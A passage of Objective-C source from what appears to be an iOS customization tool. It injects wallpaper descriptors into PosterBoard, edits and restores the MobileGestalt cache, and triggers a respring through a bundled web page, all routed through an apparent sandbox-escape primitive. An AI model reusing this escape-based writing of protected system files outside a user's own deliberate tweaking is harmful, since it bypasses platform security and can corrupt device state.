                                        withIntermediateDirectories:YES attributes:nil error:nil];
    BQEndEscape(h);
    return ok;
}

// PosterBoard keeps a migration/refresh marker in its unprotected defaults.
// Writing it after injecting descriptors forces the provider cache to rebuild
// instead of leaving a half-registered (gray) poster.
static BOOL bq_write_pb_refresh_prefs(NSString *container) {
    NSString *link = nil;
    int64_t h = BQEscape(container, &link);
    if (h < 0) {
        BQLog(@"PB prefs: escape failed (%lld)", (long long)h);
        return NO;
    }
    NSString *prefs = [link stringByAppendingPathComponent:@"Library/Preferences"];
    [[NSFileManager defaultManager] createDirectoryAtPath:prefs withIntermediateDirectories:YES attributes:nil error:nil];
    NSDictionary *d = @{
        @"PBF_RESET_FILE_PROTECTIONS": @YES,
        @"PBF_LOCALE_DID_CHANGE": @NO,
        @"PersistedPosterContainerBundleIdentifiers": @[kPBCollectionsModern, kPBCollections],
        @"CompletedPosterBundleIdentifierMigrations": @[
            @"com.apple.Posters.UnityPosterApp.ExtragalacticPoster",
            @"com.apple.Posters.WeatherPosterApp.WeatherPoster",
            @"com.apple.Posters.UnityPosterApp.Unity2025Poster",
            @"com.apple.Posters.UnityPosterApp.UnityPosterExtension",
            @"com.apple.Posters.UnityPosterApp.RhizomePoster",
            @"com.apple.Posters.KaleidoscopePosterApp.KaleidoscopePoster",
        ],
    };
    NSData *data = [NSPropertyListSerialization dataWithPropertyList:d
                                                              format:NSPropertyListBinaryFormat_v1_0
                                                             options:0 error:nil];
    NSString *path = [prefs stringByAppendingPathComponent:@"com.apple.PosterBoard.unprotectedUserDefaults.plist"];
    BOOL ok = data.length && [data writeToFile:path atomically:NO];
    BQLog(@"PB prefs refresh write=%@ path=%@", ok ? @"OK" : @"FAIL", path);
    BQEndEscape(h);
    return ok;
}

BOOL BQApplyTendies(NSURL *url, int *count, NSString **err) {
    NSData *data = [NSData dataWithContentsOfURL:url];
    if (data.length < 4 || ((const uint8_t *)data.bytes)[0] != 'P' || ((const uint8_t *)data.bytes)[1] != 'K') {
        if (err) *err = [NSString stringWithFormat:@"%@ is not a ZIP/tendies", url.lastPathComponent];
        return NO;
    }
    NSString *tmp = [NSTemporaryDirectory() stringByAppendingPathComponent:
                     [NSString stringWithFormat:@"bqtendies-%@", NSUUID.UUID.UUIDString]];
    [[NSFileManager defaultManager] createDirectoryAtPath:tmp withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *zerr = nil;
    if (!bq_unzip_data(data, tmp, &zerr)) {
        if (err) *err = zerr ?: @"unzip failed";
        [[NSFileManager defaultManager] removeItemAtPath:tmp error:nil];
        return NO;
    }
    NSArray<NSString *> *folders = bq_find_descriptors(tmp);
    if (!folders.count) {
        if (err) *err = [NSString stringWithFormat:@"no descriptors in %@", url.lastPathComponent];
        [[NSFileManager defaultManager] removeItemAtPath:tmp error:nil];
        return NO;
    }
    BQLog(@"tendies %@: %lu descriptor folder(s)", url.lastPathComponent, (unsigned long)folders.count);

    NSString *container = BQFindPosterBoardContainer(err);
    if (!container) {
        [[NSFileManager defaultManager] removeItemAtPath:tmp error:nil];
        return NO;
    }

    int written = 0;
    for (NSString *folder in folders) {
        // Determine provider from the path inside the archive.
        NSString *ext = kPBCollections;
        NSString *lower = folder.lowercaseString;
        if ([lower containsString:@"mercuryposter"]) ext = kPBMercury;
        else if ([lower containsString:@"photosposter"] || [lower containsString:@"video-descriptor"]) ext = kPBPhotos;
        else if ([lower containsString:@"wallpaperkit"]) ext = kPBCollections;

        BOOL preserveIDs = [folder containsString:@"/container/"];
        if (!preserveIDs) bq_randomize_descriptor(folder);
        NSString *destName = preserveIDs ? folder.lastPathComponent : NSUUID.UUID.UUIDString;
        NSMutableArray *targets = [NSMutableArray arrayWithObject:ext];
        if ([ext isEqualToString:kPBCollections]) [targets addObject:kPBCollectionsModern];

        BOOL wroteOne = NO;
        for (NSString *targetExt in targets) {
            bq_ensure_pb_descriptors(container, targetExt, NULL);
            NSString *target = [container stringByAppendingPathComponent:
                [NSString stringWithFormat:@"Library/Application Support/PRBPosterExtensionDataStore/%@/Extensions/%@/descriptors",
                 kPBExtVersion, targetExt]];
            NSString *link = nil;
            int64_t h = BQEscape(target, &link);
            if (h < 0) {
                BQLog(@"apply: escape to %@ failed (%lld)", targetExt, (long long)h);
                continue;
            }
            NSString *dest = [link stringByAppendingPathComponent:destName];
            if (preserveIDs) [[NSFileManager defaultManager] removeItemAtPath:dest error:nil];
            NSError *e = nil;
            if ([[NSFileManager defaultManager] copyItemAtPath:folder toPath:dest error:&e]) {
                wroteOne = YES;
                BQLog(@"apply: %@ -> %@", folder.lastPathComponent, targetExt);
            } else {
                BQLog(@"apply: copy %@ -> %@ failed: %@", folder, targetExt, e);
            }
            BQEndEscape(h);
        }
        if (wroteOne) written++;
    }
    if (written) bq_write_pb_refresh_prefs(container);
    [[NSFileManager defaultManager] removeItemAtPath:tmp error:nil];
    if (count) *count = written;
    if (written == 0) {
        if (err) *err = @"no descriptors were written";
        return NO;
    }
    return YES;
}

BOOL BQResetPosterBoard(NSString **err) {
    NSString *container = BQFindPosterBoardContainer(err);
    if (!container) return NO;
    int removed = 0;
    for (NSString *ext in BQPosterBoardExtensions()) {
        bq_ensure_pb_descriptors(container, ext, NULL);
        NSString *target = [container stringByAppendingPathComponent:
            [NSString stringWithFormat:@"Library/Application Support/PRBPosterExtensionDataStore/%@/Extensions/%@/descriptors",
             kPBExtVersion, ext]];
        NSString *link = nil;
        int64_t h = BQEscape(target, &link);
        if (h < 0) continue;
        NSArray *items = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:link error:nil];
        for (NSString *item in items) {
            if ([[NSFileManager defaultManager] removeItemAtPath:[link stringByAppendingPathComponent:item] error:nil]) removed++;
        }
        BQEndEscape(h);
    }
    BQLog(@"PB reset: removed %d item(s)", removed);
    return YES;
}

BOOL BQOpenPosterBoard(void) {
    dlopen("/System/Library/Frameworks/MobileCoreServices.framework/MobileCoreServices", RTLD_NOW);
    Class c = NSClassFromString(@"LSApplicationWorkspace");
    if (!c) { BQLog(@"LSApplicationWorkspace missing"); return NO; }
    id ws = ((id (*)(id, SEL))objc_msgSend)(c, @selector(defaultWorkspace));
    if (!ws) return NO;
    ((void (*)(id, SEL, id))objc_msgSend)(ws, @selector(openApplicationWithBundleID:), @"com.apple.PosterBoard");
    BQLog(@"opened PosterBoard");
    return YES;
}

// -------------------------------------------------------------- Gestalt ---
NSString *BQBackupPath(void) {
    return [BQDocuments() stringByAppendingPathComponent:@"OriginalGestalt.plist"];
}

BOOL BQBackupExists(void) {
    return [[NSFileManager defaultManager] fileExistsAtPath:BQBackupPath()];
}

NSString *BQMobileGestaltPath(void) {
    return [kMGCaches stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
}

BOOL BQInPlaceWrite(void) {
    NSNumber *n = [[NSUserDefaults standardUserDefaults] objectForKey:@"BQInPlaceWrite"];
    return n ? n.boolValue : YES;
}

void BQSetInPlaceWrite(BOOL on) {
    [[NSUserDefaults standardUserDefaults] setBool:on forKey:@"BQInPlaceWrite"];
    [[NSUserDefaults standardUserDefaults] synchronize];
    BQLog(@"in-place write = %d", on);
}

static BOOL bq_write_all(int fd, const uint8_t *buf, size_t len) {
    size_t off = 0;
    while (off < len) {
        ssize_t n = write(fd, buf + off, len - off);
        if (n <= 0) return NO;
        off += (size_t)n;
    }
    return YES;
}

static BOOL bq_write_data(NSString *path, NSData *data, NSString **err) {
    NSData *original = [NSData dataWithContentsOfFile:path];
    if (BQInPlaceWrite()) {
        int fd = open(path.fileSystemRepresentation, O_RDWR | O_CLOEXEC | O_NOFOLLOW);
        if (fd >= 0) {
            BOOL ok = (ftruncate(fd, 0) == 0) &&
                      bq_write_all(fd, data.bytes, data.length) &&
                      (fsync(fd) == 0);
            if (!ok && original.length) {
                BQLog(@"in-place write failed; rolling back original (%lu bytes)", (unsigned long)original.length);
                ftruncate(fd, 0);
                lseek(fd, 0, SEEK_SET);
                bq_write_all(fd, original.bytes, original.length);
                fsync(fd);
            }
            close(fd);
            if (ok) return YES;
            BQLog(@"in-place write failed, falling back to atomic");
        } else {
            BQLog(@"in-place open failed: %s", strerror(errno));
        }
    }
    NSString *tmp = [path stringByAppendingString:@".bqtmp"];
    if (![data writeToFile:tmp atomically:NO]) {
        if (err) *err = @"temp write failed";
        return NO;
    }
    int fd = open(tmp.fileSystemRepresentation, O_RDONLY);
    if (fd >= 0) { fsync(fd); close(fd); }
    int r = rename(tmp.fileSystemRepresentation, path.fileSystemRepresentation);
    if (r != 0) {
        if (err) *err = [NSString stringWithFormat:@"rename failed: %s", strerror(errno)];
        unlink(tmp.fileSystemRepresentation);
        return NO;
    }
    return YES;
}

static NSString *bq_mg_plist_path(NSString *link) {
    if ([link.lastPathComponent isEqualToString:@"com.apple.MobileGestalt.plist"]) return link;
    return [link stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"];
}

NSMutableDictionary *BQLoadGestalt(NSString **err) {
    NSString *link = nil;
    int64_t h = BQEscape(kMGCaches, &link);
    if (h < 0) {
        if (err) *err = bq_escape_error(h);
        return nil;
    }
    NSString *plist = bq_mg_plist_path(link);
    NSData *data = [NSData dataWithContentsOfFile:plist];
    NSMutableDictionary *dict = [NSMutableDictionary dictionaryWithContentsOfFile:plist];
    if (data.length && !BQBackupExists()) {
        [data writeToFile:BQBackupPath() atomically:YES];
        BQLog(@"MG backup created (%lu bytes)", (unsigned long)data.length);
    }
    BQEndEscape(h);
    if (!dict) {
        if (err) *err = @"MobileGestalt plist missing or invalid";
        return nil;
    }
    BQLog(@"MG loaded: %lu CacheExtra key(s), %lu byte(s)",
          (unsigned long)[dict[@"CacheExtra"] count], (unsigned long)data.length);
    return dict;
}

BOOL BQSaveGestalt(NSDictionary *dict, NSString **err) {
    if (![dict isKindOfClass:[NSDictionary class]]) {
        if (err) *err = @"invalid dictionary";
        return NO;
    }
    NSError *e = nil;
    NSData *data = [NSPropertyListSerialization dataWithPropertyList:dict
                                                              format:NSPropertyListBinaryFormat_v1_0
                                                             options:0 error:&e];
    if (!data.length) {
        if (err) *err = [NSString stringWithFormat:@"serialize failed: %@", e];
        return NO;
    }
    NSString *link = nil;
    int64_t h = BQEscape(kMGCaches, &link);
    if (h < 0) {
        if (err) *err = bq_escape_error(h);
        return NO;
    }
    NSString *plist = bq_mg_plist_path(link);
    BOOL ok = bq_write_data(plist, data, err);
    if (ok) {
        NSMutableDictionary *check = [NSMutableDictionary dictionaryWithContentsOfFile:plist];
        if (!check) {
            ok = NO;
            if (err) *err = @"post-write verification failed";
        } else {
            BQLog(@"MG saved: %lu bytes, %lu CacheExtra keys",
                  (unsigned long)data.length, (unsigned long)[check[@"CacheExtra"] count]);
        }
    }
    BQEndEscape(h);
    return ok;
}

BOOL BQRestoreGestalt(NSString **err) {
    NSData *backup = [NSData dataWithContentsOfFile:BQBackupPath()];
    if (!backup.length) {
        if (err) *err = @"backup not found";
        return NO;
    }
    NSString *link = nil;
    int64_t h = BQEscape(kMGCaches, &link);
    if (h < 0) {
        if (err) *err = bq_escape_error(h);
        return NO;
    }
    NSString *plist = bq_mg_plist_path(link);
    BOOL ok = bq_write_data(plist, backup, err);
    if (ok) {
        NSMutableDictionary *check = [NSMutableDictionary dictionaryWithContentsOfFile:plist];
        ok = (check != nil);
        BQLog(@"MG restored: %lu bytes ok=%d", (unsigned long)backup.length, ok);
    }
    BQEndEscape(h);
    return ok;
}

// -------------------------------------------------------------- respring ---
static WKWebView *gRespringWebView __attribute__((unused));
static UIView *gRespringOverlay __attribute__((unused));

static UIWindow *bq_key_window(void) {
    for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
        if (![scene isKindOfClass:[UIWindowScene class]]) continue;
        for (UIWindow *w in ((UIWindowScene *)scene).windows) {
            if (w.isKeyWindow) return w;
        }
    }
    return UIApplication.sharedApplication.windows.firstObject;
}

void BQRespring(void) {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *win = bq_key_window();
        if (!win) { BQLog(@"respring: no window"); return; }
        BQLog(@"respring: NeoSpring start");
        UIView *black = [[UIView alloc] initWithFrame:win.bounds];
        black.backgroundColor = [UIColor blackColor];
        black.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
        [win addSubview:black];
        UIActivityIndicatorView *sp = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleLarge];
        sp.center = CGPointMake(black.bounds.size.width / 2.0, black.bounds.size.height / 2.0);
        sp.autoresizingMask = UIViewAutoresizingFlexibleLeftMargin | UIViewAutoresizingFlexibleRightMargin |
                              UIViewAutoresizingFlexibleTopMargin | UIViewAutoresizingFlexibleBottomMargin;
        sp.color = [UIColor whiteColor];
        [sp startAnimating];
        [black addSubview:sp];
        gRespringOverlay = black;

        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.25 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            WKWebViewConfiguration *cfg = [[WKWebViewConfiguration alloc] init];
            cfg.defaultWebpagePreferences.allowsContentJavaScript = YES;
            WKWebView *wv = [[WKWebView alloc] initWithFrame:win.bounds configuration:cfg];
            wv.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
            wv.userInteractionEnabled = NO;
            [win insertSubview:wv belowSubview:black];
            NSString *path = [[NSBundle mainBundle] pathForResource:@"respring" ofType:@"html"];
            if (path.length) {
                NSURL *u = [NSURL fileURLWithPath:path];
                [wv loadFileURL:u allowingReadAccessToURL:[u URLByDeletingLastPathComponent]];
            } else {
                BQLog(@"respring.html missing");
            }
            gRespringWebView = wv;
        });
    });
}
